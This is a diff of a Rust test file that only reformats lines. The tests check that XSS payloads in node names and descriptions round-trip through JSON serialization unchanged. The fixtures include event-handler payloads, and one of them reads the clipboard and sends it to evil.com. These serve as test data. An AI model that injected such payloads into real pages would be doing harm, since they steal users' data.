@@ -223,7 +223,8 @@ fn xss_event_handler_ondblclick_in_node_name() {
 
 #[test]
 fn xss_event_handler_oncontextmenu_in_node_name() {
-    let payload = r#"<div oncontextmenu="event.preventDefault();alert('right-click')">right-click me</div>"#;
+    let payload =
+        r#"<div oncontextmenu="event.preventDefault();alert('right-click')">right-click me</div>"#;
     assert_name_roundtrip(payload);
 }
 
@@ -241,7 +242,8 @@ fn xss_event_handler_ondrop_in_node_name() {
 
 #[test]
 fn xss_event_handler_onpaste_in_node_name() {
-    let payload = r#"<input onpaste="navigator.clipboard.readText().then(t=>fetch('//evil.com/?p='+t))">"#;
+    let payload =
+        r#"<input onpaste="navigator.clipboard.readText().then(t=>fetch('//evil.com/?p='+t))">"#;
     assert_name_roundtrip(payload);
 }
 
@@ -253,7 +255,8 @@ fn xss_event_handler_oncopy_in_node_name() {
 
 #[test]
 fn xss_event_handler_onscroll_in_node_name() {
-    let payload = r#"<div onscroll="fetch('//evil.com/?scroll=1')" style="height:9999px">scroll</div>"#;
+    let payload =
+        r#"<div onscroll="fetch('//evil.com/?scroll=1')" style="height:9999px">scroll</div>"#;
     assert_name_roundtrip(payload);
 }
 
@@ -271,7 +274,8 @@ fn xss_event_handler_onanimationend_in_node_name() {
 
 #[test]
 fn xss_event_handler_ontransitionend_in_node_name() {
-    let payload = r#"<div style="transition:all 0.1s" ontransitionend="eval('alert(1)')">transition</div>"#;
+    let payload =
+        r#"<div style="transition:all 0.1s" ontransitionend="eval('alert(1)')">transition</div>"#;
     assert_name_roundtrip(payload);
 }
 
@@ -281,9 +285,15 @@ fn xss_event_handler_onerror_in_node_description() {
     let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
     node.description = payload.to_string();
     let json = serde_json::to_string(&node).expect("serialize");
-    assert!(json.contains("onerror"), "onerror in description must survive");
+    assert!(
+        json.contains("onerror"),
+        "onerror in description must survive"
+    );
     let recovered: Node = serde_json::from_str(&json).expect("deserialize");
-    assert_eq!(recovered.description, payload, "description roundtrip verbatim");
+    assert_eq!(
+        recovered.description, payload,
+        "description roundtrip verbatim"
+    );
 }
 
 #[test]
@@ -292,7 +302,10 @@ fn xss_event_handler_onload_in_node_description() {
     let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
     node.description = payload.to_string();
     let json = serde_json::to_string(&node).expect("serialize");
-    assert!(json.contains("onload"), "onload in description must survive");
+    assert!(
+        json.contains("onload"),
+        "onload in description must survive"
+    );
     let recovered: Node = serde_json::from_str(&json).expect("deserialize");
     assert_eq!(recovered.description, payload);
 }
